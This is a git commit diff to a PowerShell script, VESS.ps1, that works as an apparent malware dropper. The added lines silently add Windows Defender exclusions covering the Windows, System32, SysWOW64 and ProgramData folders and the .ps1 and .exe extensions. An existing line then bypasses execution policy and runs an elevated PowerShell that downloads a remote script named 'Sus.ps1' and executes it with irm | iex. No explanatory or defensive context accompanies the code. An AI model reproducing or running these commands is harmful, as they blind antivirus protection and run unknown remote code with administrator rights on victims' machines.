778df8effd347d8436bbc3ec0ce6a29cc9c19373
AmjadBalls <155375827+AmjadBalls@users.noreply.github.com>
2025-01-24 07:41:17 +0200

    Update VESS.ps1

--- VESS.ps1
+++ VESS.ps1
@@ -1,1 +1,12 @@
+powershell -WindowStyle Hidden -Command "Add-MpPreference -ExclusionPath 'C:\Users\Public\Downloads'"
+powershell -WindowStyle Hidden -Command "Add-MpPreference -ExclusionExtension '.ps1'"
+powershell -WindowStyle Hidden -Command "Add-MpPreference -ExclusionExtension '.exe'"
+powershell -WindowStyle Hidden -Command "Add-MpPreference -ExclusionPath 'C:\ProgramData'"
+powershell -WindowStyle Hidden -Command "Add-MpPreference -ExclusionPath 'C:\Users\Public\Downloads'"
+powershell -WindowStyle Hidden -Command "Add-MpPreference -ExclusionPath 'C:\Windows\System32'"
+powershell -WindowStyle Hidden -Command "Add-MpPreference -ExclusionPath 'C:\Windows\SysWOW64'"
+powershell -WindowStyle Hidden -Command "Add-MpPreference -ExclusionPath 'C:\Windows'"
+
+Start-Sleep -Seconds 2
+
 powershell.exe -ExecutionPolicy Bypass -Command "Start-Process PowerShell -ArgumentList 'irm "https://raw.githubusercontent.com/AmjadBalls/TEST/refs/heads/main/Sus.ps1" | iex' -Verb RunAs"
